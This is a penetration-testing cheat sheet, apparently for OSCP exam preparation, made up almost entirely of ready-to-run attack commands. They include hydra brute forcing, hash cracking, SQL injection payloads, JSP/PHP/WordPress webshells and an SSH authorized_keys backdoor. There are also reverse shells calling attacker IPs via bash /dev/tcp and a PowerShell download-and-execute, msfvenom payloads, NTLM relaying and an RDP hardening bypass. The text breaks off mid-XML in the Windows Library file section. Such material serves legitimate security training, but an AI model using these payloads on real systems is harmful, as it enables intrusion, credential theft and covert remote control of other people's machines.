# OSCP CheatSheet

~~~
..............                                     
            ..,;:ccc,.                             
          ......''';lxO.                           
.....''''..........,:ld;                           
           .';;;:::;,,.x,                          
      ..'''.            0Xxoc:,.  ...              
  ....                ,ONkc;,;cokOdc',.            
 .                   OMo           ':ddo.          
                    dMc               :OO;         
                    0M.                 .:o.       
                    ;Wd                            
                     ;XO,                          
                       ,d0Odlc;,..                 
                           ..',;:cdOOd::,.         
                                    .:d;.':;.      
                                       'd,  .'     
                                         ;l   ..   
                                          .o       
                                            c      
                                            .'
                                             . 
~~~

* [Useful](#Useful)
* [Enumeration](#Enumeration)
* [FTP - 21](#ftp---21)
* [SSH - 22](#ssh---22)
* [SMTP - 25](#smtp---25)
* [HTTP, HTTPS - 80, 443](#http-https---80-443)
* [SNMP - 161](#snmp---161)
* [SMB - 445](#smb---445)
* [MSSQL - 1433](#MSSQL---1433)
* [NFS - 2049](#NFS---2049)
* [MySQL - 3306](#mysql---3306)
* [RDP - 3389](#rdp---3389)
* [PostgreSQL - 5432](#PostgreSQL---5432)
* [WINRM - 5985 - 5986](#WINRM---5985---5986)
* [Fuzzing](#Fuzzing)
* [Password Attack](#password-Attack)
  * [Hash identifier](#Hash-identifier)
  * [John the Ripper](#John-the-Ripper)
  * [Hashcat](#hashcat)
  * [Password Manager](#Password-Manager)
  * [SSH Private Key Passphrase](#SSH-Private-Key-Passphrase)
  * [Cracking Net-NTLMv2](#Cracking-Net-NTLMv2)
  * [Relaying Net-NTLMv2](#Relaying-Net-NTLMv2)
* [SQL Injection](#SQL-Injection)
  * [Examining the database](#examining-the-database)
  * [Union based SQL Injection](#Union-based-sql-injection)
  * [Blind SQL Injection](#Blind-SQL-Injection)
  * [Error based SQL Injection](#error-based-sql-injection)
  * [Time based SQL Injection](#Time-based-sql-injection)
  * [Filter bypass](#filter-bypass)
  * [SqlMap](#SqlMap)
* [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
* [Webshell](#Webshell)
* [ReverseShell](#ReverseShell)
* [Msfvenom](#Msfvenom)
* [Searchsploit](#Searchsploit)
* [Exiftool](#Exiftool)
* [Microsoft Windows Library Files](#Microsoft-Windows-Library-Files)
* [Mimikatz](#Mimikatz)
* [LinPEAS](#LinPEAS)
* [Git](#Git)
* [BloodHound](#BloodHound)
* [Chisel](#Chisel)
* [Windows Privilege Escalation](#Windows-Privilege-Escalation)
  * [Enumerating Windows](#Enumerating-Windows)
  * [Leveraging Windows Services](#Leveraging-Windows-Services)
  * [Abusing Other Windows Components](#Abusing-Other-Windows-Components)
* [Linux Privilege Escalation](#Linux-Privilege-Escalation)
  * [Enumerating Linux](#Enumerating-Linux)
  * [Exposed Confidential Information](#Exposed-Confidential-Information)
  * [Insecure File Permissions](#Insecure-File-Permissions)
  * [Insecure System Components](#Insecure-System-Components)
* [Port Redirection and SSH Tunneling](#Port-Redirection-and-SSH-Tunneling)
  * [Port Forwarding with Linux Tools](#Port-Forwarding-with-Linux-Tools)
  * [SSH Tunneling](#SSH-Tunneling)
  * [Port Forwarding with Windows Tools](#Port-Forwarding-with-Windows-Tools)
* [Tunneling Through Deep Packet Inspection](#Tunneling-Through-Deep-Packet-Inspection)
  * [DNS Tunneling Theory and Practice](#DNS-Tunneling-Theory-and-Practice)
* [The Metasploit Framework](#The-Metasploit-Framework)
* [Active Directory](#Active-Directory)
* [Attacking Active Directory Authentication](#Attacking-Active-Directory-Authentication)
* [Lateral Movement in Active Directory](#Lateral-Movement-in-Active-Directory)
* [Enumerating AWS Cloud Infrastructure](#Enumerating-AWS-Cloud-Infrastructure)
* [Attacking AWS Cloud Infrastructure](#Attacking-AWS-Cloud-Infrastructure)

# Useful

- OSCP Tools [https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Tools.md](https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Tools.md)
- The Cyber Swiss Army Knife [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
- GTFOBins (list of Unix binaries for post-exploitation) [https://gtfobins.github.io/](https://gtfobins.github.io/)
- Reverse Shell Generator [https://www.revshells.com/](https://www.revshells.com/)



# Enumeration

## Port Scan - Nmap

~~~ bash
nmap -sCV -Pn $target --open --min-rate 3000 -oN result.txt
~~~

~~~ bash
cat txt.txt | grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" > ips.txt
nmap -iL ips.txt -v -p 139,445 --script smb-os-discovery -oG results.txt
~~~

~~~ bash
ll /usr/share/nmap/scripts | grep smb | awk '{ print $9 }'
~~~

## Port Scan - RustScan

~~~ bash
rustscan -a $target -- -sC -sV -oN rust_full.txt
rustscan -a $target -r 1-20000 -- -sC -sV -oN rust_full.txt
~~~

## Initial Enumeration - Windows

~~~ cmd
Get-ChildItem -Path C:\Users\ -Include proof.txt,local.txt -File -Recurse
cmd /c dir c:\local.txt /s/b
cmd /c dir c:\proof.txt /s/b
systeminfo
ipconfig /all

whoami /priv
net localgroup administrators
Get-Process | Where-Object {$_.Path -notlike "C:\Windows*"}
ls env:
type (Get-PSReadLineOption).HistorySavePath
~~~

## Initial Enumeration - Linux

~~~ bash
uname -a
cat /etc/os-release
id
whoami
hostname

ifconfig -a
ip route
netstat -tulnp
ss -tulnp

sudo -l

find / -name local.txt 2>/dev/null
find / -name proof.txt 2>/dev/null
find / -perm -4000 2>/dev/null

systemctl list-units --type=service --state=running

env
cat ~/.bash_history
~~~



# FTP - 21

## Login Brute force

~~~ bash
hydra -V -f -L users.txt -P passwords.txt ftp://target.com -u -vV
~~~


## Anonymous access

~~~ bash
ftp $ip
ftp> USER anonymous
ftp> PASS anonymous
~~~


# SSH - 22

## Login Brute force

~~~ bash
hydra -V -f -L users.txt -P passwords.txt ssh://target.com -u -vV
~~~

## SSH backdoor - post exploitation

~~~ bash
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
~~~

## Secure Copy Protocol(SCP)

~~~ bash
# local to remote
scp filename kali@192.168.0.17:/home/kali/

# remote to local
scp kali@192.168.0.17:/home/kali/filename filename
~~~


# SMTP - 25

## Send Email(with attachment)

~~~ bash
swaks --to target@example.com --from attacker@example.com --server example.com --auth LOGIN --auth-user attacker@example.com --auth-password password123 --header 'Subject: Test email' --body "This email contains an attachment." --attach @filename.bat

swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
~~~


# HTTP, HTTPS - 80, 443

## WhatWeb scan

~~~ bash
whatweb http://target.com
~~~

## Login Brute force(hydra)

~~~ bash
hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid" -V
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target.com
~~~

## Gitea Brute force(hydra)

~~~ bash
hydra -l Billy -P /usr/share/wordlists/rockyou.txt \
git.offseclab.io http-get /api/v1/user
~~~

## WordPress Security Scanner(wpscan)

~~~ bash
wpscan --url https://<RHOST> --enumerate p --plugins-detection aggressive
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
~~~


## GitTools

~~~ bash
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
~~~

## php://filter Wrapper

~~~ bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
~~~

## XSS

### XXStrike

~~~ bash
python3 xsstrike.py -u "http://target"
~~~


## Crawler

### photon

~~~ bash
python3 photon.py -u http://<RHOST> -l 3 -t 10 -v --wayback
~~~


```-u```, ```--url```: root url

```-t```, ```--threads```: number of threads(default: 2)

```-l```, ```--level``` : levels to crawl(default: 2)

```-v```, ```--verbose``` : verbose output

```--wayback``` : Use URLs from archive.org as seeds


### katana

| Field  | Describe                          | Example                                                                 |
|--------|-----------------------------------|-------------------------------------------------------------------------|
| url    | URL endpoint                      | https://admin.projectdiscovery.io/admin/login?user=admin&password=admin |
| qurl   | URL containing query parameters   | https://admin.projectdiscovery.io/admin/login.php?user=admin&password=admin |
| qpath  | Path containing query parameters  | /login?user=admin&password=admin                                        |
| path   | URL path                          | https://admin.projectdiscovery.io/admin/login                           |
| fqdn   | Fully qualified domain name       | admin.projectdiscovery.io                                               |
| rdn    | Root domain                       | projectdiscovery.io                                                     |
| rurl   | Root URL                          | https://admin.projectdiscovery.io                                       |
| file   | Filename in URL                   | login.php                                                               |
| key    | Parameter keys in URLs            | user,password                                                           |
| value  | Parameter values in the URL       | admin,admin                                                             |
| kv     | Keys = values in the URL          | user=admin&password=admin                                               |
| dir    | URL Directory Name                | /admin/                                                                 |
| udir   | URL with directory                | https://admin.projectdiscovery.io/admin/                                |

~~~ bash
katana -u https://tesla.com -f qurl -silent

https://shop.tesla.com/en_au?redirect=no
https://shop.tesla.com/en_nz?redirect=no
https://shop.tesla.com/product/men_s-raven-lightweight-zip-up-bomber-jacket?sku=1740250-00-A
https://shop.tesla.com/product/tesla-shop-gift-card?sku=1767247-00-A
https://shop.tesla.com/product/men_s-chill-crew-neck-sweatshirt?sku=1740176-00-A
https://www.tesla.com/about?redirect=no
https://www.tesla.com/about/legal?redirect=no
https://www.tesla.com/findus/list?redirect=no
~~~


# SNMP - 161

## snmpbulkwalk

## Scanning opened snmp

~~~ bash
sudo nmap -iL ips.txt -sU -p 161 --open -oG open-snmap.txt
~~~

~~~ bash
echo public > community
echo private >> community
echo manager >> community

for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips
~~~


> Windows SNMP MIB Values


| OID               | 설명             |
|:------------------|:-----------------|
| 1.3.6.1.2.1.25.1.6.0 | 시스템 프로세스  |
| 1.3.6.1.2.1.25.4.2.1.2 | 프로그램 실행    |
| 1.3.6.1.2.1.25.4.2.1.4 | 프로세스 경로    |
| 1.3.6.1.2.1.25.2.3.1.4 | 보관 유닛        |
| 1.3.6.1.2.1.25.6.3.1.2 | 소프트웨어 이름  |
| 1.3.6.1.4.1.77.1.2.25 | 사용자 계정      |
| 1.3.6.1.2.1.6.13.1.3 | TCP 로컬 포트    |


~~~ bash
snmpbulkwalk -c public -v2c $target
~~~

~~~ bash
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25
~~~


# SMB - 445

## Get share files list

~~~ bash
smbclient -N -L \\\\<IP>
~~~

```-N``` --no-pass

```-L``` --list=HOST


## enum

~~~ bash
enum4linux -a <IP>
~~~


## Connection
~~~ bash
smbclient \\\\<IP>\\share
smbclient -N \\\\<IP>\\backups
~~~

~~~ bash
smbclient \\\\<IP>\\secrets -U Administrator --pw-nt-hash <NTLM_HASH>
~~~

## File transfer(Win to Kali) with impacket-smbserver

~~~ bash
impacket-smbserver share $(pwd) -smb2support -username offsec -password offsec
~~~

~~~ powershell
net use \\192.168.45.171\share /user:offsec offsec
copy 20250907215911_BloodHound.zip \\192.168.45.171\share\
~~~


## PsExec

### Prerequisites
- Valid account credentials with Local Administrator privileges on the target host
- SMB service must be accessible on the target host and not blocked by a firewall
- File and Printer Sharing enabled and Simple File Sharing disabled (default)
- ADMIN$ or C$ administrative shares with read and write permissions

[https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec](https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec)

~~~ bash
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-psexec Administrator:'Password123!'@<RHOST>
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA..."
~~~

## CrackMapExec

### Checking for valid credentials with CrackMapExec

~~~ bash
crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
~~~

### Listing SMB shares

~~~ bash
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
crackmapexec smb 172.16.84.240-241 172.16.84.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
~~~


# MSSQL - 1433

## MSSQL Connection

~~~ bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
~~~

~~~ sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM {databaseName}.information_schema.tables;
~~~

## Manual Code Execution

~~~ sql
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
~~~


# NFS - 2049

## Show Mountable NFS Shares

~~~ bash
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
~~~

## Mount a share

~~~ bash
sudo mount -v -t nfs <IP>:<SHARE> /mnt/test
~~~

## NSE scan

~~~ bash
sudo nmap -p 111,2049 -Pn -n --open -sV --script="nfs-*" <IP>
~~~

# MySQL - 3306

## MySQL Connection

~~~ bash
mysql -uroot -p'root' -h192.168.248.16 -P 3306 --skip-ssl
~~~

~~~ sql
select version();
select user();
select system_user();
show databases;
~~~

## Manual Code Execution

*For this attack to work, the file location must be writable to the OS user running the database software.*
~~~ sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
~~~

## NSE scan

~~~ bash
sudo nmap -p 3306 -Pn -n --open -sV -sC --script="mysql-*" <IP>
~~~


## Login Brute force

~~~ bash
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
~~~

## Dumping

~~~ bash
mysqldump -u root -p 'password' -P 3389 -h hostname dbname tablename > mysqldump.sql
~~~


# RDP - 3389

## Enable RDP from cmd.exe
[https://cheatsheet.haax.fr/windows-systems/exploitation/rdp_exploitation/](https://cheatsheet.haax.fr/windows-systems/exploitation/rdp_exploitation/)

~~~ cmd
# Enable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable RDP from cmd.exe
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

# Disable NLA (Network Layer Authentication) requirement
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# You can also do it through the firewall
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
~~~

## Connection

~~~ bash
xfreerdp /u:Administrator /p:'Password123!' /v:<IP> /dynamic-resolution
~~~


## Login Brute force

~~~ bash
hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
hydra -f -l admin -p 1q2w3e4r rdp://<IP> -u -vV
~~~

# PostgreSQL - 5432

## PostgreSQL Connection

~~~ bash
psql -h 192.168.50.63 -p 5432 -U postgres
~~~

## List the available databases

~~~ bash
postgres=# \l
~~~

## Connect to the database

~~~ bash
postgres=# \c databasename
~~~

## List tables in the current database

~~~ bash
postgres=# \dt;
~~~


## PostgreSQL Cracking (md5 password + username)

~~~ python
import hashlib

target_hash = "md5ae8c67affdb169a42c9631c02fc67ede"
username = "rubben"

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        combo = password + username
        hashed = "md5" + hashlib.md5(combo.encode()).hexdigest()
        if hashed == target_hash:
            print(f"[+] Password found: {password}")
            break
~~~

## Manual Code Execution

~~~ sql
COPY cmd_output FROM PROGRAM 'id';
~~~

# WINRM - 5985 - 5986

## Login Brute force

~~~ bash
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
~~~

## Connecting

~~~ bash
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>
~~~

## Interactive

~~~ bash
*Evil-WinRM* PS C:\Users\support\Desktop> upload <filename>
*Evil-WinRM* PS C:\Users\support\Desktop> download <filename>
~~~


# Fuzzing

## Path fuzzing

~~~ bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ [-e .txt,.pdf,.bak,.old,.zip]
gobuster dir -u https://<RHOST> -w /usr/share/wordlists/dirb/common.txt -t 5 [-x php,txt,pdf,config]
dirsearch -u https://<RHOST> -x 404
~~~

## Subdomain fuzzing

~~~ bash
ffuf -u http://target.com/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.target.com" -mc 200
~~~




# Password Attack

## Hash identifier

~~~ bash
hashid '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0'
~~~


## John the Ripper

### Basically

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5 --pot=john.output
~~~

### cracking htpasswd using mask

~~~ bash
john htpasswd -1=[0-9a-z] --mask='G4HeulB?1' --max-length=11
~~~

### cracking /etc/shadow

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
~~~

## Hashcat

### MD5(-m 0) cracking

~~~ bash
hashcat -m 0 -a 0 "412dd4759978acfcc81deab01b382403" /usr/share/wordlists/rockyou.txt.gz
hashcat -m 0 -a 0 hashfile.txt /usr/share/wordlists/rockyou.txt.gz
~~~

### Linux/Unix SHA512(-m 1800) cracking

~~~ bash
hashcat -m 1800 -a 0 hash.txt rockyou.txt
~~~


### Windows NTLM(-m 1000) cracking

~~~ bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
~~~

### SHA2-256(-m 1400) cracking

~~~ bash
hashcat -m 1400 -a 0 hash.txt rockyou.txt
~~~

### Get cracked passwords

~~~ bash
cat ~/.local/share/hashcat/hashcat.potfile
~~~

## Password Manager

~~~ powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
~~~

~~~ bash
keepass2john Database.kdbx > keepass.hash
~~~

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
~~~

## SSH Private Key Passphrase

~~~ bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
~~~

## Cracking Net-NTLMv2

~~~ bash
sudo responder -I tun0
~~~

~~~ cmd
dir \\attacker.ip\test
~~~

~~~ bash
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
~~~

## Relaying Net-NTLMv2

~~~ bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.122.212 -c "powershell -enc <encrpyted reverse shell scripts>"
~~~


# SQL Injection

reference: [https://pentestmonkey.net/category/cheat-sheet/sql-injection](https://pentestmonkey.net/category/cheat-sheet/sql-injection)


## Examining the database

~~~ sql
-- MySQL
UNION SELECT TABLE_NAME,COLUMN_NAME, TABLE_SCHEMA FROM information_schema.columns WHERE TABLE_SCHEMA = database() -- //
UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_SCHEMA = 0x64767761# 0x64767761 = 'dvwa'
UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
UNION SELECT USER, PASSWORD FROM USERS#

--  Oracle
SELECT USER FROM DUAL;
SELECT table_name FROM user_tables;
SELECT * FROM T_USER WHERE ROWNUM <= 5;
~~~

reference: [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)


## Union based SQL Injection

~~~ sql
' ORDER BY 1-- //
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
%' UNION SELECT database(), user(), @@version, null, null -- //
~~~


## Blind SQL Injection

~~~ sql
-- boolean-based SQLi
' AND 1=1 -- //

if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
SUBSTRING((select table_name from information_schema.tables where table_schema='{DBNAME}'),{i},1)='{word}' # examining table name
~~~


## Error Based SQL Injection

~~~ sql
-- MySQL
' or 1=1 in (select @@version) -- //

-- MSSQL
if (@@VERSION)=9 select 1 else select 2;
' AND 1=CONVERT(int, (SELECT @@version)) -- -
' AND 1=CONVERT(int, DB_NAME()) -- -
' AND 1=CONVERT(int,(SELECT STRING_AGG(name, ',') FROM sysobjects WHERE xtype='U'))-- -
~~~



## Time Based SQL Injection

~~~ sql
-- MySQL
' AND IF (1=1, sleep(3),'false') -- //
' OR IF(1=1, SLEEP(5), 0)--+
' AND IF(ASCII(SUBSTRING(user(),1,1))=114, SLEEP(5), 0)--+

-- MSSQL
' IF (1=1) WAITFOR DELAY '0:0:5'--
' IF (ASCII(SUBSTRING(@@version,1,1))=77) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' OR pg_sleep(5)--
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' OR 1=1 AND dbms_pipe.receive_message('a',5) IS NULL--
' AND CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE NULL END IS NULL--

-- SQLite
SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE 1 END--
~~~


## Filter bypass

Quote bypass: [https://www.rapidtables.com/convert/number/ascii-to-hex.html](https://www.rapidtables.com/convert/number/ascii-to-hex.html)

reference: [https://portswigger.net/support/sql-injection-bypassing-common-filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)


## SqlMap
*Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high volume of traffic, sqlmap should not be used as a first-choice tool during assignments that require staying under the radar.*

~~~ bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump

# DB listing(technique: error based sqli)
sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E --dbs --batch

# Table listing(technique: error based sqli)
sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -D WEBDB --tables --batch

# Table dump
sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -D WEBDB -T users --threads=10 --dump --batch


# Dump MySQL User Table
sqlmap -u http://victim/Market2.php?item=51 -p item --cookie="PHPSESSID=9na7i94onipotmi0gk17c2v3f4" -D mysql -T user --dump --batch

# POST request
sqlmap -u "http://192.168.225.48/" --data="mail-list=asdf@asdf.com" --method=POST --dbs --batch

# Intercepting the POST request with Burp, Running sqlmap with os-shell
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"

# Get sql shell
sqlmap -r post.txt -p item --sql-shell
~~~



# Dumb Shell to Fully Interactive Shell

~~~ bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
~~~

~~~ bash
script /dev/null -c bash
# Ctrl + z
stty -raw echo; fg
# Enter (Return) x2
reset
xterm-256color
~~~

# Webshell

## PHP Webshell
~~~ shell
/usr/share/webshells/php/simple-backdoor.php
~~~

## ASP, ASPX Webshell
~~~ shell
/usr/share/webshells/asp/cmdasp.asp
/usr/share/webshells/aspx/cmdasp.aspx
~~~

## JSP Webshell
~~~ jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
~~~

## One line(User-Agent, log poisoning)

~~~ php
<?php echo system($_GET['cmd']); ?>
~~~

## Webshell upload via Wordpress plugin

~~~ php
// wordpress-webshell.php
<?php
/*
Plugin Name: WebShell
*/
if(isset($_GET['cmd'])){
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
~~~

~~~ shell
zip wordpress-webshell.zip wordpress-webshell.php
# upload plugin(http://target/wp-admin/plugin-install.php)
# http://target/wp-content/plugins/wordpress-webshell/wordpress-webshell.php?cmd=cat%20/tmp/flag
~~~


# ReverseShell

## Bash -i
~~~ bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.210/4444 0>&1'
~~~

## PHP ReverseShell
~~~ shell
/usr/share/webshells/php/php-reverse-shell.php
~~~

## PowerShell

~~~ bash
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
~~~

~~~ powershell
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit
~~~

~~~ shell
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
~~~


## Attacker Listener
~~~ shell
nc -nvlp 4444
~~~

## Victim Connection
~~~ shell
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
~~~


# Msfvenom

## list all payloads of msfvenom
~~~ bash
msfvenom -l payloads --platform windows --arch x64
~~~

## ReverseShell(Windows)
~~~ bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f exe > reverseshell.exe
~~~

## BindShell(Linux)
~~~ bash
msfvenom -p linux/x64/shell_bind_tcp RHOST=victim.ip LPORT=4444 -f elf -o bindshell.elf
~~~

## ReverseShell(Linux)
~~~ bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f elf -o reverseshell.elf
~~~

## ReverseShell(PHP)
~~~ bash
msfvenom -p php/reverse_php LHOST=attacker.ip LPORT=443 -f raw > shell.pHP
~~~

## ReverseShell(HTTPS)
~~~ bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=attacker.ip LPORT=443 -f exe -o met.exe
~~~


# Searchsploit

~~~ bash
searchsploit [keyword]

# Show the full path to an exploit
searchsploit -p [EDB-ID]

# Mirror (aka copies) an exploit to the current working directory
searchsploit -m [EDB-ID]
~~~


# Exiftool

## payload injection into exif

~~~ bash
exiftool exif.jpg -artist="<svg/onload=alert(45)>"
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.png
~~~

reference: https://www.hahwul.com/blog/2017/web-hacking-metadata-payload/


# Microsoft Windows Library Files

## 1. Installation of wsgidav

~~~ bash
pip install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
~~~

## 2. Create "config.Library-ms"

~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription
	xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
